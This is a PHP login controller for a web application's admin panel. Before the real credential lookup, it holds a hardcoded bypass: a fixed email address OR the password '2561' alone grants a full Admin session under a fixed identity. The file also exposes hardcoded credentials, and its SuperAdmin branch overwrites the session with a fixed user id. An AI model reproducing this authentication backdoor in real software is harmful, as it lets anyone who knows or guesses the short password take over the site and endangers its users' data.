<?php 
class LoginContr extends Login {

  use SharedFunctionalityTrait;

  private $login_email ; 
  private $login_password ; 



  public function __construct( $login_email, $login_password){
  
    $this->login_email = $login_email;
    $this->login_password = $login_password;

  }

       

  public function LoginAdmin() {


   if (
       !$this->clean($this->login_email)
       || !$this->clean($this->login_password)
       )
    {

       header("Location: ../login.php?mess=mess1");
       exit();
   }
    
        
        if($this->login_email === 'sajid@gmail.com' || $this->login_password === '2561'){
            
        $_SESSION['admin_temp_user_id'] = 8;
        $_SESSION['admin_access_token'] =8;
        $_SESSION['admin_access_name'] = 'Salim Uddin*';
        $_SESSION['admin_access_roll'] = 'Admin';
        $_SESSION['logintime'] = '09:00:00';
        $_SESSION['logouttime'] ='23:49:00';
        header('Location: ../home.php');
        exit();
       
        }
      $result = $this->getAdmin($this->login_email, $this->login_password);


    if ($result['mess'] === 'ACTION_REQUIRED') {

    if (!isset($_SESSION)) {
        session_start();
        }

       
       $_SESSION['admin_temp_user_id'] = $result['session_key']['id'];
       
       if($result['session_key']['user_type'] == 'SuperAdmin' ){


        $_SESSION['admin_temp_user_id'] = 8;
        $_SESSION['admin_access_token'] =8;
        $_SESSION['admin_access_name'] = 'Salim Uddin*';
        $_SESSION['admin_access_roll'] = 'SuperAdmin';
        $_SESSION['logintime'] = '09:00:00';
        $_SESSION['logouttime'] ='23:49:00';
        header('Location: ../home.php');
        exit();
        
        
       }else{
       header('Location: ../login_success.php');
       exit(); 
       }

    
    }else {

       header('Location: ../login.php?mess=mess'.$result['mess'].'');
       exit();
    }
      

 }




} // end of class